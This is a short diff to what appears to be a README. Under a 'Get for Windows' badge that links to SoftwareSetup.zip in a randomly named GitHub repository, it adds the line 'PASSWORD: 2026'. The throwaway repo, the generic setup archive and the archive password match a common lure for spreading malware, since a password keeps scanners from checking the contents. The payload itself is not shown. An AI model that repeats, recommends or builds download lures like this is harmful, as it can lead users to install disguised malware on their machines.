@@ -7,6 +7,9 @@
 <div align="center">
 
   [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
+
+**PASSWORD: 2026**
+  
 </div>
 
 ---
